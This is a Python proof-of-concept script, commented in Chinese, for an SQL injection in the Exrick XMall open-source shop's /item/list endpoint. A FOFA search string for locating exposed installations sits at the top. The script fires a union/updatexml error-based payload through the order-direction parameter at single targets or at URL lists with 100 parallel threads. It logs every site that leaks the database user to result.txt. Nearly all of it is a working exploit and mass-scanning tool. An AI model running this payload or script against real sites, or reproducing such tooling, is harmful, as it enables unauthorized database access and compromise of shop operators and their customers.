# Exrick XMall 开源商城存在SQL注入漏洞
# fofa:app="XMall-后台管理系统"

# 导入所需的库
import requests, sys, argparse
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()  # 禁用警告信息

def banner():
    # 定义横幅文本并打印
    test = """                              _                      
       _                     ( )                   _ 
      (_)   _ _    _     ___ | |__   _   _    _ _ (_)
(`\/')| | /'_` ) /'_`\ /',__)|  _ `\( ) ( ) /'_` )| |
 >  < | |( (_| |( (_) )\__, \| | | || (_) |( (_| || |  version:1.0.0
(_/\_)(_)`\__,_)`\___/'(____/(_) (_)`\___/'`\__,_)(_)  author :冷酷小帅                                             
"""
    print(test)

def main():
    # 显示程序的横幅
    banner()
    # 创建命令行参数解析器
    parser = argparse.ArgumentParser(description="Exrick XMall 开源商城存在SQL注入漏洞")
    # 添加 -u/--url 参数，用于输入要检测的链接
    parser.add_argument('-u', '--url', dest='url', type=str, help='Please input your link')
    # 添加 -f/--file 参数，用于输入包含链接列表的文件路径
    parser.add_argument('-f', '--file', dest='file', type=str, help='Please input your file path')
    args = parser.parse_args()  # 解析命令行参数
    # 根据提供的参数执行相应的检测操作
    if args.url and not args.file:
        poc(args.url)  # 单独检测提供的URL
    elif not args.url and args.file:
        # 批量检测文件中列出的URLs
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n', ''))
        mp = Pool(100)  # 创建进程池
        mp.map(poc, url_list)  # 对列表中的每个URL执行poc函数
        mp.close()  # 关闭进程池
        mp.join()  # 等待所有进程完成
    else:
        # 如果没有提供URL或文件，打印使用说明
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    # 定义SQL注入漏洞利用的payload
    payload_url = '/item/list?draw=1&order%5B0%5D%5Bcolumn%5D=1&order%5B0%5D%5Bdir%5D=desc)a+union+select+updatexml(1,concat(0x7e,user(),0x7e),1)%23;&start=0&length=1&search%5Bvalue%5D=&search%5Bregex%5D=false&cid=-1&_=1679041197136'
    url = target + payload_url
    headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Referer": "https://fofa.info",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "zh-CN,zh;q=0.9",
            "Connection": "close",
    }
    try:
        res = requests.get(url=url,headers=headers,timeout=5,verify=False).text
        # 检查响应文本中是否包含特定的字符串，作为SQL注入漏洞的判断依据
        if 'root@localhost' in res:
            print(f'[+]该url:{target}存在SQL注入漏洞')
            with open('result.txt','a',encoding='utf-8') as f:
                f.write(f'[+]该url:{target}存在SQL注入漏洞'+'\n')
        else:
            print(f'[-]该url:{target}存在访问问题，请手动测试')
    except:
        # 异常处理，打印访问问题信息
        print(f'[-]该url:{target}存在访问问题，请手动测试')
# 脚本入口点
if __name__ == '__main__':
    main()